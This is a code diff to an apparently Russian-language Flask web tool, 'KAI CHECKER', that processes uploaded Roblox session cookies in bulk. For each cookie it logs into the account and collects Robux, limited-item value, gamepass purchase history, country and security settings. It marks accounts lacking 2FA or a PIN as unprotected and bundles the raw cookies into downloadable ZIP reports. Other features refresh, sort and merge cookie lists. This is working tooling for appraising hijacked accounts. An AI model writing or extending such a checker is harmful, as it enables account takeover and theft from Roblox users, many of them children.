@@ -39,11 +39,20 @@ def get_next_test_info():
 TEST_NUM, SERVER_START_TIME = get_next_test_info()
 
 # ============================================================
-# ФУНКЦИИ (100% СТАБИЛЬНЫЙ ЧЕКЕР)
+# ПОЛНЫЙ ЧЕКЕР (С ГЕЙМПАССАМИ, БЕЗОПАСНОСТЬЮ, РЕДКИМИ ПРЕДМЕТАМИ)
 # ============================================================
 
 def get_full_info(cookie: str) -> dict:
-    info = {'status': '⚠️', 'Username': '?', 'Robux': 0, 'TotalRAP': 0}
+    info = {
+        'status': '⚠️', 'Username': '?', 'UserID': '?', 'Robux': 0,
+        'TotalRAP': 0, 'Created': '?', 'Country': '?',
+        'EmailSet': False, 'TwoFactorEnabled': False,
+        'AccountPinEnabled': False, 'PhoneSet': False,
+        'SecurityStatus': '⚠️ НЕЗАЩИЩЕННЫЙ',
+        'Cookie': cookie,
+        'PurchasedGamepasses': {},
+        'RareItems': []
+    }
     try:
         cleaned_cookie = cookie.strip()
         if ".ROBLOSECURITY=" in cleaned_cookie:
@@ -53,7 +62,7 @@ def get_full_info(cookie: str) -> dict:
         s.headers.update({
             'Cookie': f'.ROBLOSECURITY={cleaned_cookie}',
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-            'Accept': 'application/json, text/plain, */*',
+            'Accept': 'application/json',
             'Referer': 'https://www.roblox.com/',
             'Origin': 'https://www.roblox.com'
         })
@@ -74,19 +83,173 @@ def get_full_info(cookie: str) -> dict:
             
         uid = info['UserID']
 
-        rb = s.get(f'https://economy.roblox.com/v1/users/{uid}/currency', verify=False, timeout=10)
-        if rb.status_code == 200:
-            info['Robux'] = rb.json().get('robux', 0)
+        def g(url):
+            try:
+                r = s.get(url, verify=False, timeout=10)
+                return r.json() if r.status_code == 200 else {}
+            except:
+                return {}
 
-        ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
-        if ir.status_code == 200:
-            total_rap = 0
-            for item in ir.json().get('data', []):
-                total_rap += item.get('recentAveragePrice', 0) or 0
-            info['TotalRAP'] = total_rap
-    except:
+        # ===== БЕЗОПАСНОСТЬ =====
+        d = g('https://www.roblox.com/my/settings/json')
+        if d:
+            security = d.get('MyAccountSecurityModel', {})
+            info['EmailSet'] = security.get('IsEmailSet', False)
+            info['TwoFactorEnabled'] = security.get('IsTwoStepEnabled', False)
+            info['AccountPinEnabled'] = security.get('IsAccountPinEnabled', False)
+            info['PhoneSet'] = security.get('IsPhoneSet', False)
+
+        # ===== ДАТА СОЗДАНИЯ =====
+        rd = g(f'https://users.roblox.com/v1/users/{uid}')
+        if rd:
+            try:
+                dt = datetime.fromisoformat(rd.get('created', '').replace('Z', '+00:00'))
+                info['Created'] = dt.strftime('%d.%m.%Y')
+            except:
+                pass
+
+        # ===== ROBUX =====
+        rb = g(f'https://economy.roblox.com/v1/users/{uid}/currency')
+        if rb:
+            info['Robux'] = rb.get('robux', 0)
+
+        # ===== СТРАНА =====
+        country = g('https://users.roblox.com/v1/users/authenticated/country-code')
+        if country:
+            info['Country'] = country.get('countryCode', '?')
+
+        # ===== RAP + РЕДКИЕ ПРЕДМЕТЫ =====
+        try:
+            tr = 0
+            ri = []
+            ir = s.get(f'https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Desc', verify=False, timeout=10)
+            if ir.status_code == 200:
+                data = ir.json()
+                for item in data.get('data', []):
+                    rap = item.get('recentAveragePrice', 0) or 0
+                    tr += rap
+                    if rap >= 1000:
+                        ri.append({'name': item.get('name', '?'), 'rap': rap})
+            info['TotalRAP'] = tr
+            ri.sort(key=lambda x: x['rap'], reverse=True)
+            info['RareItems'] = ri[:10]
+        except:
+            pass
+
+        # ===== ГЕЙМПАССЫ =====
+        try:
+            gp_url = f"https://economy.roblox.com/v2/users/{uid}/transactions?limit=100&transactionType=Purchase"
+            cursor = ""
+            page = 0
+            gamepasses_dict = {}
+            
+            while page < 10:
+                url = gp_url + f"&cursor={cursor}" if cursor else gp_url
+                r = s.get(url, verify=False, timeout=12)
+                if r.status_code != 200:
+                    break
+                data = r.json()
+                for item in data.get('data', []):
+                    details = item.get('details', {})
+                    item_type = str(details.get('type', ''))
+                    price = abs(item.get('currency', {}).get('amount', 0))
+                    if price >= 100 and (item_type in ['GamePass', 'DeveloperProduct'] or 'GamePass' in str(details)):
+                        name = details.get('name', 'Товар')
+                        place_info = details.get('place', {})
+                        place_name = place_info.get('name', 'Неизвестная игра')
+                        if place_name not in gamepasses_dict:
+                            gamepasses_dict[place_name] = []
+                        gamepasses_dict[place_name].append({'name': name, 'price': price})
+                cursor = data.get('nextPageCursor')
+                if not cursor:
+                    break
+                page += 1
+                time.sleep(0.15)
+            
+            info['PurchasedGamepasses'] = gamepasses_dict
+        except Exception as e:
+            logger.error(f"Gamepass error: {e}")
+
+        # ===== СТАТУС БЕЗОПАСНОСТИ =====
+        security_score = 0
+        if info.get('EmailSet'): security_score += 1
+        if info.get('TwoFactorEnabled'): security_score += 2
+        if info.get('AccountPinEnabled'): security_score += 1
+        if info.get('PhoneSet'): security_score += 1
+
+        if security_score >= 4:
+            info['SecurityStatus'] = '🔒 ВЫСОКИЙ'
+        elif security_score >= 2:
+            info['SecurityStatus'] = '🔐 СРЕДНИЙ'
+        else:
+            info['SecurityStatus'] = '⚠️ НИЗКИЙ (НЕЗАЩИЩЕН!)'
+    except Exception as e:
+        logger.error(f"Err: {e}")
         info['status'] = '❌'
     return info
+
+# ============================================================
+# ФОРМАТИРОВАНИЕ ОТЧЁТОВ
+# ============================================================
+
+def format_short_report(info):
+    """Краткий отчёт для сайта"""
+    if info['status'] != '✅':
+        return f"❌ {info['Username']} — невалидный кук"
+    return f"📋 {info['Username']} | 💰 {info['Robux']:,} | 💎 {info['TotalRAP']:,}"
+
+def generate_full_txt_report(info):
+    """Полный отчёт для .txt файла"""
+    if info['status'] != '✅':
+        return f"❌ {info['Username']} — невалидный кук\nCookie: {info['Cookie']}"
+    
+    r = "╔══════════════════════════════════════════════════════════╗\n"
+    r += "║  🎮 KAI CHECKER — ПОЛНЫЙ ОТЧЁТ                        ║\n"
+    r += "╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  📋 {info['Username']}\n"
+    r += f"║  🆔 {info['UserID']}\n"
+    r += f"║  📅 Создан: {info['Created']}\n"
+    r += f"║  🌍 Страна: {info['Country']}\n"
+    r += "╠══════════════════════════════════════════════════════════╣\n"
+    r += f"║  💰 Robux: {info['Robux']:,}\n"
+    r += f"║  💎 RAP: {info['TotalRAP']:,}\n"
+    r += "╠══════════════════════════════════════════════════════════╣\n"
+    r += "║  🛡️ БЕЗОПАСНОСТЬ:\n"
+    r += f"║  📧 Почта: {'✅' if info['EmailSet'] else '❌'}\n"
+    r += f"║  🔐 2FA: {'✅' if info['TwoFactorEnabled'] else '❌'}\n"
+    r += f"║  🔒 Пин: {'✅' if info['AccountPinEnabled'] else '❌'}\n"
+    r += f"║  📱 Телефон: {'✅' if info['PhoneSet'] else '❌'}\n"
+    r += f"║  {info['SecurityStatus']}\n"
+    r += "╠══════════════════════════════════════════════════════════╣\n"
+    
+    # Геймпассы
+    gp = info.get('PurchasedGamepasses', {})
+    if gp:
+        r += "║  📦 ГЕЙМПАССЫ:\n"
+        for game, passes in gp.items():
+            game_total = sum(p['price'] for p in passes)
+            r += f"║  🎮 {game} (⏣ {game_total:,}):\n"
+            for p in passes[:5]:
+                r += f"║      └ {p['name']} — ⏣ {p['price']:,}\n"
+            if len(passes) > 5:
+                r += f"║      └ ...и ещё {len(passes)-5}\n"
+    else:
+        r += "║  📦 ГЕЙМПАССЫ: ❌ Нет\n"
+    
+    r += "╠══════════════════════════════════════════════════════════╣\n"
+    
+    # Редкие предметы
+    rare = info.get('RareItems', [])
+    if rare:
+        r += "║  💎 РЕДКИЕ ПРЕДМЕТЫ:\n"
+        for item in rare[:10]:
+            r += f"║    └ {item['name']} — ⏣ {item['rap']:,}\n"
+    else:
+        r += "║  💎 РЕДКИЕ ПРЕДМЕТЫ: ❌ Нет\n"
+    
+    r += "╚══════════════════════════════════════════════════════════╝\n\n"
+    r += f"🍪 COOKIE:\n{info['Cookie']}"
+    return r
 
 # ============================================================
 # ФРЕШЕР
@@ -193,7 +356,6 @@ HTML = """<!DOCTYPE html>
             background-image: radial-gradient(circle at 10% 20%, #1a1040 0%, #0b081a 80%);
             position: relative;
         }
-        
         .host-test-badge {
             position: fixed;
             bottom: 15px;
@@ -870,15 +1032,15 @@ HTML = """<!DOCTYPE html>
             
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Проверено: ${data.total || 0}\\n📦 Активных: ${data.total_gamepasses || 0}\\n💎 RAP: ${data.total_rap || 0}\\n\\n`;
+                let html = `✅ Проверено: ${data.total || 0}\n📦 Активных: ${data.total_gamepasses || 0}\n💎 RAP: ${data.total_rap || 0}\n\n`;
                 if (data.reports && data.reports.length) {
-                    html += `<b>📋 ОТЧЁТЫ:</b>\\n`;
+                    html += `<b>📋 ОТЧЁТЫ:</b>\n`;
                     for (const report of data.reports) {
-                        html += `\\n${report}\\n─────────────────\\n`;
+                        html += `\n${report}\n─────────────────\n`;
                     }
                 }
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
                 saveCheckerHistory(data.total || 0, data.total_gamepasses || 0, data.total_rap || 0);
@@ -949,7 +1111,7 @@ HTML = """<!DOCTYPE html>
         const resultWrapper = document.getElementById('freshResultWrapper');
         const resultCode = document.getElementById('freshResultCode');
         
-        const cookies = input.value.trim().split('\\n').filter(c => c.trim().length > 50);
+        const cookies = input.value.trim().split('\n').filter(c => c.trim().length > 50);
         if (!cookies.length) {
             status.textContent = '❌ Нет куков';
             return;
@@ -1015,10 +1177,10 @@ HTML = """<!DOCTYPE html>
         progressText.textContent = '100%';
         
         if (newCookies.length) {
-            resultCode.textContent = newCookies.join('\\n');
+            resultCode.textContent = newCookies.join('\n');
             resultWrapper.style.display = 'flex';
             document.getElementById('freshCopyBtn').onclick = function() {
-                navigator.clipboard.writeText(newCookies.join('\\n')).then(() => {
+                navigator.clipboard.writeText(newCookies.join('\n')).then(() => {
                     this.textContent = '✅ Скопировано!';
                     setTimeout(() => { this.textContent = '📋 Копировать'; }, 2000);
                 });
@@ -1097,9 +1259,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Валидных: ${data.valid}\\n❌ Невалидных: ${data.invalid}\\n📊 Всего: ${data.total}`;
+                let html = `✅ Валидных: ${data.valid}\n❌ Невалидных: ${data.invalid}\n📊 Всего: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать валидные</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать валидные</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1125,9 +1287,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Сортировка завершена!\\n📦 Куков: ${data.total}`;
+                let html = `✅ Сортировка завершена!\n📦 Куков: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1153,9 +1315,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Разделение завершено!\\n📦 Куков: ${data.total}`;
+                let html = `✅ Разделение завершено!\n📦 Куков: ${data.total}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать ZIP</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1181,9 +1343,9 @@ HTML = """<!DOCTYPE html>
             const data = await r.json();
             if (data.success) {
                 resBox.className = 'result-box success';
-                let html = `✅ Слияние завершено!\\n📦 Куков: ${data.total}\\n🔄 Дублей удалено: ${data.duplicates}`;
+                let html = `✅ Слияние завершено!\n📦 Куков: ${data.total}\n🔄 Дублей удалено: ${data.duplicates}`;
                 if (data.download_url) {
-                    html += `\\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>`;
+                    html += `\n📥 <a href="${data.download_url}" class="btn btn-primary" target="_blank" style="text-decoration:none;">Скачать</a>`;
                 }
                 resBox.innerHTML = html;
             } else {
@@ -1214,25 +1376,46 @@ def index():
 def api_fullcheck():
     if 'file' not in request.files:
         return jsonify({"success": False, "message": "Файл не найден"})
+    
     content = request.files['file'].read().decode('utf-8', errors='ignore')
     cookies = [line.strip() for line in content.split('\n') if '.ROBLOSECURITY' in line or len(line) > 50]
+    
     if not cookies:
         return jsonify({"success": False, "message": "Куки не найдены"})
+    
     reports = []
+    full_reports = []
     total_rap = 0
     total_gamepasses = 0
+    
     for c in cookies[:20]:
         info = get_full_info(c)
         if info['status'] == '✅':
-            reports.append(f"📋 {info['Username']} | 💰 {info['Robux']} | 💎 {info['TotalRAP']}")
+            reports.append(format_short_report(info))
+            full_reports.append(info)
             total_rap += info['TotalRAP']
-            total_gamepasses += 1
+            total_gamepasses += len(info.get('PurchasedGamepasses', {}))
+    
+    # ===== СОЗДАЁМ ZIP С ПОЛНЫМИ ОТЧЁТАМИ =====
+    zip_buffer = BytesIO()
+    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
+        for info in full_reports:
+            filename = f"{info['Username']}_{info['UserID']}.txt"
+            zf.writestr(filename, generate_full_txt_report(info))
+    zip_buffer.seek(0)
+    
+    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+    filename = f"full_reports_{timestamp}.zip"
+    with open(f"downloads/{filename}", 'wb') as f:
+        f.write(zip_buffer.getvalue())
+    
     return jsonify({
         "success": True,
         "total": len(cookies),
         "total_rap": total_rap,
         "total_gamepasses": total_gamepasses,
-        "reports": reports
+        "reports": reports,
+        "download_url": f"/downloads/{filename}"
     })
 
 @app.route("/api/fresh", methods=["POST"])
